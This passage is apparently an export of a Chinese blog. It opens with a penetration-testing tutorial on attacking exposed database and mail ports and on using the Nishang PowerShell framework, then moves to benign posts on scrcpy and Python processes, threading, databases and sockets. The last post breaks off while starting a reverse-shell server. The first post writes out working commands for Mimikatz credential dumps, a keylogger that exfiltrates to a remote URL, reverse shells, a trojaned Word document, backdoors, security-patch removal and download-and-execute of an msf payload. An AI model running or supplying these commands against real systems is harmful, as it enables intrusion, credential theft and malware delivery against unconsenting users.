PostgreSQL数据库PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。默认端口： 5432 攻击方式： 爆破弱口令：postgres postgres 缓冲区溢出：CVE-2014-2669 MongoDB数据库MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考默认端口： 27017 攻击方式： 爆破弱口令 未授权访问 Redis数据库redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 Exp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547默认端口： 6379 攻击方式： 爆破弱口令 未授权访问+配合ssh key提权 SysBase数据库默认端口：服务端口5000；监听端口4100；备份端口：4200 攻击方式： 爆破： 弱口令; 命令注入 DB2数据库默认端口：5000 攻击方式： 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922） 总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！ 邮件服务端口渗透SMTP协议smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！默认端口： 25（smtp）、465（smtps） 攻击方式： 爆破：弱口令 未授权访问 POP3协议默认端口： 109（POP2）、110（POP3）、995（POP3S） 攻击方式： 爆破弱口令 未授权访问 IMAP协议默认端口：143（imap）、993（imaps） 攻击方式： 爆破：弱口令 配置不当 网络常见协议端口渗透DNS服务默认端口： 53 攻击方式： 区域传输漏洞 DHCP服务默认端口：67&amp;68、546（DHCP Failover做双机热备的） 攻击方式： DHCP劫持 SNMP协议默认端口： 161攻击方式: 爆破弱口令 Powershell框架 推荐使用 NiShang 参考文章：https://www.4hou.com/posts/E99ml 下载地址: https://github.com/samratashok/nishang 各种命令解析： https://www.explainshell.com 安装问题nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级） powershell ISE是一个编译器 powershell有很多渗透框架： PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异 实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要 目录结构： 模块和功能介绍： 演示：端口扫描 密码获取 键盘记录 反弹会话 口令爆破 实战应用： 后续控制 域渗透 系统提权 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189# 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）Import-Module .nishang.psml# 载入模块 查看NiShang都有哪些模块Get-Command -Moudle nishang## 查看机器基本信息Get-Information# 把结果导出文件 Out-FileGet-Information | Out-File res.txt# 检测是否为虚拟机Check-VM## 获取密码Invoke-Minikatz#Dump出本机的凭证信息Invoke-Minikatz -DumpCerts#dump出远程的两台计算机的凭证信息Invoke-Minikatz -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)#在远程的一台机器上运行Mimikatz 并执行 &quot;privilege::debug exit&quot;Invoke-Minikatz -Command &quot;privilege::debug exit&quot; -ComputerName@(&quot;computer1&quot;)# Get-PassHashes 获取密码# 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）Get-PassHashes# 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率Get-PassHints## 获取帮助参数 Get-HelpGet-Help Invoke-PortScan## 端口扫描查看帮助信息Get-Help Invoke-PortScan -fullInvoke-PortScanInvoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost # cd 切换到对应目录## 测试键盘记录: Get-Help .\Keylogger.ps1 --full # 查看帮助（提供了四种方式记录）#-URL 要把记录发Keylogger送到的置顶的远程服务器 , -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录.\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php # 解释： 将记录指定发送给一个可以记录Post请求的Web服务器# 默认保存到(内容是ascii码)： Windows/Temp/key.log# 把ascii记录解析为非ascii：Parse_Keys .\key.log .\parsed.txt# 持久化记录（重启之后也记录）.\Keylogger.ps1 -persist## 爆破口令 在scan目录下面#用于对SQL Server、域控制器、Web和FTP弱口令爆破Invoke-BruteForce#命令参数如下-ComputerName # 对应服务的计算机名-UserList 用户名字典-PasswordList 密码字典-Service 服务（默认为：SQL）-StopOnSuccess 匹配一个后停止-Delay 延迟时间#比如Invoke-BruteForce -ComputerName xx-PC -UserList user.txt -PasswordList pass.txt -Service ActiveDirectory -Verbose# 内网扫描器# 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener#1.在本机开启监听FireListener 130-150#2.在目标机器输入命令：FireListener 192.168.0.107 130-150 -Verbose## 内网嗅探动静很大，实在没有办法的时候可以试试目标机执行以下命令Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999本机监听nc -lvvp 9999## 屏幕窃取 Show-TargetScreen#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443 # 将远程的画面传输给 192.168.230.1 的443端口参数： Bind --&gt; 正向连接在目标机执行以下命令（反向连接）Show-TargetScreen -IPAddress 192.168.230.172 -Port 3333本机输入以下命令 ，接着访问本机的9999端口nc -nlvp 3333 | nc -nlvp 9999正向连接目标机执行：Show-TargetScreen -Bind -Port 3333本机执行：nc -nv 192.168.230.37 3333 | nc -lnvp 9999## Client 的生成(类似木马)需要自己绑定payload首先在本机监听：nc -lvp 4444接着制作word文件，打开\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行Invoke-Encode -DataToEncode &apos;复制的代码&apos; -IsString -PostScript执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt接着执行命令Out-Word-PayloadScript .\encodedcommand.txt会生成一个word文档，用户打开就中招，我们获取到反弹的powershell## 后门1.Http-Backdoor可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本2.Add-ScrnSaveBackdoor利用windows的屏保来留下一个隐藏的后门3.Execute-OnTime与Http-Backdoor相比，多了定时功能4.Invoke-ADSBackdoor使用NTFS数据流留下的一个永久后门最恐怖的后门## 钓鱼攻击(有道用户输入自己机器的密码)Invoke-CredentialsPhish## webshell后门 位于 \nishang\Antak-WebShell目录下就是一个asp的大马（使用的是powershell的命令，比cmd命令强大）# 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）Copy-VSS # 直接把文件保存在当前路径下Copy-VSS -DEstinationDir C:temp # 制定文件保存路径（必须是已存在的路径）## 其他...... 后续控制12345678910111213141516171819202122232425262728293031323334# windows上没有nc，需要提前上传一个nc.exe，推荐Linux## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip） 在Shells目录下面#1.攻击机器上 NC下执行: nc -lvp 3333#2.在目标服务器 PowerShell下执行： TCO的Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333## NO2.正向连接:#1.目标 PowerShell下执行: TCP的， 另外还有UDP的: Invoke-PowerShellTcp -Bind -Port 3333#NC下执行: 请求他的3333端口nc -nv 192.168.0.103 3333### 基于UDP( Invoke-PowerShellUdp )， nc命令有点不同正向连接nc -nvu 192.168.0.103 3333反向连接nc lup 3333### 基于http和https （ Invoke-PoshRatHttp ）### 此外,还有http的shell(执行完会生成一条命令，然后???)Invoke-PoshRatHttp -Reverse -IPAddress 192.168.0.103 -Port 3333Invoke-PoshRatHttps -Reverse -IPAddress 192.168.0.103 -Port 3333# 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话 域渗透在nishang目录下面的ActiveDirectory下面 疑难杂症1.真实案例分析 12 2.各种安全限制 12345无解析无权限无执行 系统提权 基于数据库 基于漏洞（常用，如果电脑没补丁，可以删除补丁） 第三方软件 1234567891011121314151617181920# 查看系统的补丁systeminfo# 删除补丁Remove-Update # 然后输入补丁编号# 删除全部补丁Remove-Update All# 删除全部的安全补丁Remove-Update Security# 删除指定的补丁Remove-Update KB2761226#### Bypass UAC : 模块:Invoke-PsUACmeUAC (用户账户控制)Get-Help 获取帮助 powershell下载文件(nishang)123456789101112131415161718192021222324252627282930$client = new-object System.Net.WebClient$client.DownloadFile('#1', '#2')#1是需要下载文件的url#2是保存为本地文件的路径，包括文件名例如：$client.DownloadFile('https://www.2cto.com/net/201611/562900.html', 'D:/562900.html')# 或者这个方法$src = 'https://www.pstips.net/index.php'$des = "$env:temp\index.php"Invoke-WebRequest -uri $src -OutFile $desUnblock-File $des# 下载完之后就可以用啦## 下载执行 Download_Execute下载文本文件，然后转换为可执行文件执行利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件ExetoTxt c:msf.exe c:msf.txt然后输入以下命令，调用`Download Execute`脚本下载并执行该文件Download Execute http://192.168.110.128/msf.txt这时，msf的监听端就会成功获得反弹回来的shell powershell是没有杀毒软件提示的]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrcpy-手机与电脑投屏神器]]></title>
    <url>%2Fscrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[scrcpy 安装1snap install scrcpy adb服务安装1sudo apt-get install android-tools-adb adb配置手机通过USB连接电脑1lsusb 找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个) 创建设备文件下面所有的04e8改成自己的识别号, android.rules文件名可自定义 12345mkdir ~/.android# 注意你的设备号echo 0x04e8 &gt; ~/.android/adb_usb.inisudo touch /etc/udev/rules.d/android.rulessudo gedit /etc/udev/rules.d/android.rules 在文件中输入:注意自己的设备号 1SUBSYSTEM==&quot;usb&quot;, SYSFS&#123;idVendor&#125;==&quot;你的设备号&quot;, MODE=&quot;0666&quot; 保存后修改文件权限1sudo chmod 777 /etc/udev/rules.d/android.rules 启动adb服务123service udev restartadb start-serveradb devices 有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开 使用scrcpy命令行输入 1234# 直接使用scrcpy# 设置显示尺寸为1080nohun scrcpy -m 1080 &amp; 就会弹出界面了 scrcpy使用方法123456"""鼠标左键点击、滑动;长按鼠标中键回到主屏幕;Ctrl+Shift+V鼠标右键返回复制文本电脑到手机: 电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴""" 快捷键全屏/回到合适尺寸ctrl +f ctrl + x 展开/折叠通知栏ctrl +n ctrl + shift + n 结束投屏scrcpy -S 或者关掉显示窗口即可 Scrcpy 的命令参数 关闭手机屏幕 scrcpy -S 限制画面分辨率 scrcpy -m 1024 (比如限制为 1024) 修改视频码率 scrcpy -b 4M (默认 8Mbps，改成 4Mbps) 裁剪画面 scrcpy -c 1224:1440:0:0 表示分辨率 1224x1440 并且偏移坐标为 (0,0) 多设备切换 scrcpy -s 设备ID (使用 adb devices 命令查看设备ID) 窗口置顶 scrcpy -T 显示触摸点击 scrcpy -t 在演示或录制教程时，可在画面上对应显示出点击动作 全屏显示 scrcpy -f 文件传输默认路径 scrcpy --push-target /你的/目录 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录 只读模式(仅显示不控制) scrcpy -n 屏幕录像 scrcpy -r 视频文件名.mp4 或 .mkv 屏幕录像 (禁用电脑显示) scrcpy -Nr 文件名.mkv 设置窗口标题 scrcpy --window-title &#39;异次元好棒！&#39; 同步传输声音 可借助 USBaudio 这个开源项目实现，但仅支持 Linux 系统 Scrcpy 快捷键列表 切换全屏模式 Ctrl+F 将窗口调整为1：1（完美像素） Ctrl+G 调整窗口大小以删除黑色边框 Ctrl+X \ 双击黑色背景 设备 HOME 键 Ctrl+H \ 鼠标中键 设备 BACK 键 Ctrl+B \ 鼠标右键 设备 任务管理 键 (切换APP) Ctrl+S 设备 菜单 键 Ctrl+M 设备音量+键 Ctrl+↑ 设备音量-键 Ctrl+↓ 设备电源键 Ctrl+P 点亮手机屏幕 鼠标右键 复制内容到设备 Ctrl+V 启用/禁用 FPS 计数器（stdout） Ctrl+i 安装APK 将 apk 文件拖入投屏 传输文件到设备 将文件拖入投屏（非apk） 投屏并录屏：scrcpy -r file.mp4 不投屏只录屏：scrcpy -Nr file.mp4 录制声音结合：https://github.com/rom1v/usbaudio]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>scrcpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-进程]]></title>
    <url>%2Fpython-%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[并发： 任务数大于cpu个数 并行： cpu个数和任务数相同 GIL 锁: 任何python进程中，一次永远只有一个线程运行 一个python进程 只能执行一个线程 创建进程1234567891011121314151617181920212223242526## 不同操作系统创建进程的区别：#linux上: fork() import osimport timepid = os.fork() # 这个地方会创建一个子进程， 他的pid号值永远为0if pid == 0: print("我是子进程") time.sleep(3)else: print("我是父进程") time.sleep(3)# win上创建进程 类似于导入机制 都通用的import multiprocessingdef func(): print("000")if __name__ == '__main__': p = multiprocessing.Process(target=func) # 生成进程, 传参target= ，args= p.start() # 开启进程， 相当于一个子进程 进程标识1234567891011121314151617181920212223242526272829# 进程标识 pidimport timeimport osimport multiprocessingdef func(): time.sleep(5)if __name__ == "__main__": print("main pid ", os.getpid()) # 当前进程的 print(multiprocessing.current_process().pid) p = multiprocessing.Process(target=func) print(p.pid) p.start() # start之后才有pid号 print(p.pid) time.sleep(10)# 线程的标识是 ident# 操作系统调用的是进程"""注意！操作系统并不能看到线程的标识。因为，线程是由Python解释器来负责调度的。操作系统仅需要调度进程就行了""" 守护进程12345678910111213# 守护进程 daemon = True 主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程）import timeimport multiprocessingdef func(): time.sleep(20) print("子进程结束")if __name__ == "__main__": p = multiprocessing.Process(target=func, daemon = True) p.daemon = True # 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束 p.start() time.sleep(3) 终止进程1234567891011121314# 终止进程import multiprocessingimport timedef func(): time.sleep(5) print(multiprocessing.current_process())if __name__ == "__main__": p = multiprocessing.Process(target=func) p.start() time.sleep(2) # 主进程2s p.terminate() # 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个） 面向对象123456789101112131415161718192021222324252627282930# 面向对象 类继承创建进程# start() --&gt; run(已经是在新的进程了) --&gt; target # target是由默认的run运行import multiprocessingimport timeclass My_Process(multiprocessing.Process): def __init__(self, *args, **kwargs): super().__init__(args, kwargs) print("初始化...") def run(self): """ start 默认调用的方法 重写啦在这里 :return: """ print("run...") self.task() time.sleep(5) def task(self): print("task...")if __name__ == "__main__": p = My_Process() p.start() # start 方法会调用run# 创建进程的方式 ： multiprocessing.Process 类继承，重写run linux下：fork# 如果换成是线程的话：换掉继承类就行 进程通信123456789101112131415161718192021222324# -*- coding:utf-8 -*-import multiprocessingfrom multiprocessing import Manager # 管理器def func(l): l.append(111)if __name__ == '__main__': manager = Manager() # 实例化 先开启一个公共进程，并返回一个管理器 l = manager.list() # 开启空间，左边就是代理 # l = manager.dict() """ 一般常用的空间类型是： 1. mgr.list() 2. mgr.dict() 3. mgr.Queue() """ print(l) p = multiprocessing.Process(target=func, args=(l,)) p.start() p.join() print(l) # 这样使用manager之后 l就是【共享】的了 进程池 &amp; 线程池 ps:有点乱 1234567891011121314151617181920212223242526272829303132333435363738394041# from multiprocessing import Pool # 进程池from multiprocessing.dummy import Pool #线程池from multiprocessing.pool import ThreadPool # 线程池import threadingimport timedef func(i): print("&#123;&#125;-------555".format(i)) time.sleep(2) return idef print_back(*args, **kwargs): print("处理数据完成",args, kwargs)pool = Pool(6) # 不写的话 默认是cpu的个数# print(threading.active_count())for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法# pool.apply(func=func, ) ## 添加任务 阻塞# pool.map(func, [i for i in range(5)]) #添加任务 不阻塞pool.close() #关闭线程池 不在提交新的任务pool.join() #等待进程池中的任务执行完毕print("任务结束")########### 线程池的步骤p = ThreadPool(3) # 实例化p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞p.close()p.join() # join()语句要放在close()语句后面# 进程池比线程池耗费资源# 可以将返回值.get() 但是get也会i阻塞async_result = p.apply_async(func) # 函数print(async_result.get()) 使用进程池来实现并发服务器1234567891011121314151617181920212223242526272829303132333435363738# 使用池来实现并发服务器# 先开一个进程池， 每个进程下面再开一个线程import socketfrom multiprocessing import Pool, cpu_countfrom multiprocessing.pool import ThreadPooldef woeker_thread(conn): # 使用线程池来 while True: recv_data =conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() breakdef worker_process(server): # 使用进程池来接收套接字 # pool = Pool(cpu_count()*2) # 通常可以分配2倍的cpu个数 pool = ThreadPool(cpu_count()) # 获取电脑核心数 while True: conn, addr = server.accept() pool.apply_async(woeker_thread, args=(conn,))if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) n = cpu_count() # 获得当前计算机的cpu核心数量 pool = Pool(n) for i in range(n): # 充分利用cpu，为每个cpu分配一个进程 # conn, addr = server.accept() pool.apply_async(func=worker_process, args=(server,)) pool.apply_async(func=worker_process, args=(server,)) pool.close() pool.join()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-数据库编程]]></title>
    <url>%2Fpython-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Python DBA API包含的内容 访问数据库流程 与MySQL12345678910111213141516171819202122232425262728293031323334353637383940import pymysqldb_config = &#123; 'host': '127.0.0.1', 'user': 'hhh', 'password': '123', 'db': 'test', 'charset': 'utf8'&#125;# 插入try: conn = pymysql.connect(**db_config) cursor = conn.cursor() # 插入 id = '2018002' name = 'admin' age = 18 # insert into student values(id,name,age) sql = 'insert into student(id, name, age) values(%s,%s,%s)' cursor.execute(sql, (id, name, age)) # 删除 # table = 'students' # condittion = 'age &gt; 20' # sql = 'delete from &#123;table&#125; where &#123;condittion&#125;'.format(table=table, condittion=condittion) # 查询 sql = "SELECT password FROM admin WHERE name='%s'" % (name) cursor.execute(sql) pws = cursor.fetchall() except: print('error') conn.rollback()finally: conn.commit() # 数据有变动一定记得提交/双保险 cursor.close() conn.close() cursor对象支持的方法 与MongoDB12345678910111213141516171819202122232425262728293031from pymongo import *#建立连接client = MongoClient('127.0.0.1',27017)#指定数据库db = client.test#指定集合collection = db.col# print(type(collection),collection)# python连接mongodb就搞定mydict =&#123; '_id': 6, 'name': 'admin', 'age': 18, 'addr': 'didu'&#125;# collection.insert(mydict)# print(collection.find())# for i in collection.find():# print(i)# for i in collection.find(&#123;'name':'zhanglinlin'&#125;):# print(i)collection.update(&#123;'name':'zhanglinlin'&#125;,&#123;'$set':&#123;'age':22&#125;&#125;,&#123;'mult':'true'&#125;)# collection.remove() 与redis1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import redis# # 连接,给定参数ip/port， redis默认端口6379r = redis.Redis(host='127.0.0.1', port='6379')# # print(type(r),r)## # 设置键值对r.set('name', 'admin')# # 获取该键的值str = r.get('name')print(str.decode('utf-8')) # 解码## 自动解码 参数：decode_responses=Truer = redis.Redis(host='127.0.0.1',port='6379',decode_responses=True)r.set('name','哈哈')str = r.get('name')print(str)## StrictRedisr = redis.StrictRedis(host='127.0.0.1',port='6379')r.set('name','哈哈')str = r.get('name')print(str,str.decode('utf-8'))## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2#k_v = &#123; 'a1':'a', 'a2':'b', 'a3':'c'&#125;r = redis.StrictRedis(host='127.0.0.1',port='6379')# 批量设置值r.mset(**k_v)# 批量取值print(r.mget('a1','a2','a3'))#r = redis.StrictRedis(host='127.0.0.1',port='6379')# 往列表添加值从头部开始r.lpush('list1','haha')r.lpush('list1',3,4,5)# 获取列表值print(r.lrange('list1',0,-1))#r = redis.StrictRedis(host='127.0.0.1',port='6379')r.sadd('set1','aa')r.sadd('set2','aa',8,10,'bb')print(r.smembers('set2')) 与memcached123456789101112131415161718192021222324252627282930313233import memcache# 建立连接mc = memcache.Client(['127.0.0.1:11211'], debug=True)# 设置一个mc.set('name', 'xps',time=60)# 设置多个mc.set_multi(&#123;"username":"handsome", "gender":"man"&#125;, time=60)# 获取一个mc.get('age')# 获取多个# 不管是元组还是列表都行，只要可迭代就行res1 = mc.get_multi(("username", "gender"))res2 = mc.get_multi(["username", "gender"])print(res1)print(res2)# 删除一个mc.delete("key")# 删除多个mc.delete_multi(["key1", "key2"])"""# 0表示永不过期 断电就会完蛋 适合做验证码# prepend 前插# append 后插# telnet ip port 远程连接""" 这里仅仅做了简单的介绍，具体还需要自己练习中学习]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-多线程]]></title>
    <url>%2Fpython-%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[讲解进程是程序的一次执行。每个进程都有自己的地址空间、内存、数据栈以及其他记录运行轨迹的辅助数据 线程所有的线程运行在同一个进程当中，共享相同的运行环境。线程有：开始、顺序执行、结束 三个部分。多个线程协同完成一个进程的任务。 我们在编写安全工具的时候，使用多线程要更多些(使用多进程相对较少) thread 缺点：程序复杂时，不能计算线程数量和控制，稳定性不太好 使用_thread.start_new_thread(ping_check, (ip,)) ，第一个参数是回调函数，第二个的可变参数(tuple类型的) Note： 必须配合time.sleep() 实例: 12345678910111213141516171819202122232425262728293031323334353637"""使用ping检查C段机器(一个C段是0-255)"""import _threadimport timeimport refrom subprocess import Popen,PIPEdef ping_check(ip_addr): # 一个执行系统命令的模块 check = Popen(['/bin/bash', '-c', 'ping -c 2 '+ip_addr], stdin=PIPE,stdout=PIPE) data = check.stdout.read() # 返回的数据 if 'ttl' in str(data): print("&#123;&#125; is up".format(ip_addr))def main(ip_three): for i in range(255): ip = ip_three + '.' + str(i) _thread.start_new_thread(ping_check, (ip,)) time.sleep(0.1)if __name__ == '__main__': ip_three = input("输入ip地址的前三个字节(不需要最后一个点): \n") # 判断最后是否有点 pattern = r'\.$' has_point = re.findall(pattern, ip_three) if has_point: ip_three = ip_three[:-1] print(ip_three) main(ip_three) threading (重点)1.Thead类 使用threading模块 子类化Thread类 解决了线程数量可控的问题 简单例子： 1234567891011121314151617181920212223242526272829303132import threadingimport timeimport requestsdef func1(key): print("Hello %s:%s"%(key, time.ctime())) print(threading.current_thread()) # 当前线程 print("*"*20)def main(): threads = [] keys = ['张三', '李四', '王五', '陆大人'] threads_count = len(keys) # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1, args=(keys[i],)) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞if __name__ == '__main__': main() 实例: 123456789101112131415161718192021222324252627282930313233343536373839"""对百度以10个线程访问10次"""import threadingimport timeimport requestsimport sysdef func1(): time_start = time.time() r = requests.get(url='http://www.baidu.com') times = time.time() - time_start # 耗时 sys.stdout.write("Status:%s---%s---%s"%(r.status_code, times, time.strftime("%H:%M:%S"))) # 当前时间 print("")def main(): threads = [] threads_count = 10 # 定义 线程数 # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞if __name__ == '__main__': main() 2.生产者-消费者问题 和 Queue模块 (重中之重)\ Queue模块[ qsize(), empty(), full(), put(), get() ] 完美搭档：Queue + Thread 解决了生产参数和计算结果时间都不确定的问题 最常使用 Queue： 将产生的货物放到Queue中，消费者从Queue中拿数据 12345678910111213141516import Queueq = queue.Queue(100) # 可以直接指定队列的大小for i in range(10): q.put(i) # 也可以这样放入q.empty() # 查看是否为空q.qsize() # 查看大小q.get() # 依次取出数据q.full() # 是否满了queue.task_done() # 告诉队列，这个任务执行完成了 生产者消费者讲解： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556"""所谓，生产者与消费者模型，其实是把一个需要进程通信的问题分开考虑生产者，只需要往队列里面丢东西（生产者不需要关心消费者）消费者，只需要从队列里面拿东西（消费者也不需要关心生产者生产者：只关心队列是否已满。没满，则生产，满了就阻塞。消费者：只关心队列是否为空。不为空，则消费，为空则阻塞。"""from threading import Thread # 线程import randomimport queueimport threadingimport timeclass Produce(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = random.randint(0,99) if self.queue.full(): print("当前队列长度&#123;&#125;".format(self.queue.qsize())) self.queue.put(item) # 只要队列没满， 向队列存入数据 print("生产者%s ==&gt; 已经生产 %s, 并将其加入到了队列中" %(threading.current_thread(),item))class Consumer(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = self.queue.get() # 只要队列不为空， 就从队列中取出数据 print("消费者 ==&gt; 从队列中取出 %s" %item) self.queue.task_done() # 告诉队列，这个任务执行完成了if __name__ == '__main__': q = queue.Queue(10000) p = Produce(q) p1 = Produce(q) c = Consumer(q) p.start() p1.start() time.sleep(5) c.start() 实例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152"""使用 threding 和 Quque 结合， ping_check"""import threadingimport queue # 注意是小写from subprocess import Popen,PIPEimport sys# 继承多线程的类class DoRun(threading.Thread): def __init__(self, queue): # threading.Thread.__init__(self) super().__init__() self._queue = queue # 重写了run方法 def run(self): # 如果Queue不为空就继续执行 while not self._queue.empty(): ip = self._queue.get() check_ping = Popen(['/bin/bash','-c','ping -c 2 '+ip], stdin=PIPE, stdout=PIPE) data = check_ping.stdout.read() if 'ttl' in str(data): sys.stdout.write(ip + " is up") print()def main(): threads = [] threads_count = 10 # 创建一个空的队列 q = queue.Queue() # put到队列 for i in range(1,255): q.put("123.206.96."+str(i)) # 多线程 for i in range(threads_count): threads.append(DoRun(q)) # 启动 for i in threads: i.start() for i in threads: i.join()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-socket编程]]></title>
    <url>%2Fpython-socket%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[讲解C/S架构客户机和服务器结构 Server唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔 C/S网络编程Server端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中 Client编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来 套接字(socket)是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字 套接字 = (ip, 端口) Python支持: - AF_UNIX –&gt; Unix下进行通信的 - AF_NETLINK –&gt; 是Linux下的套接字 - AF_INET –&gt; 是基于网络的套接字 （我们下面的重点） Python的socket模块创建TCP/IP套接字，方法如下： 1234# 参数（套接字家族，套接字类型）# AF_INET：基于网络的， SOCK_SREAM：代表TCP/IPtcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) 套接字对象的方法： 服务端套接字函数： 公共用途套接字函数： 创建连接之后要关闭 实例: 反弹Shell： 在客户端获取服务端的shell 1.获取Linux的shell： server.py 1234567891011121314151617181920212223242526272829303132333435"""反弹shell"""import socketfrom subprocess import Popen,PIPE # 执行系统命令HOST = '' # 如果是本机最为服务端，地址可以不用填写PORT = 8888BUFSIZE = 1024ADDR = (HOST,PORT)tcp_server = socket.socket() # type默认是tcptcp_server.bind(ADDR)tcp_server.listen(5)print("开始监听")while True: # 服务端和客户端的循环连接 print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print("... connected from:" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: try: # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令） cmd = 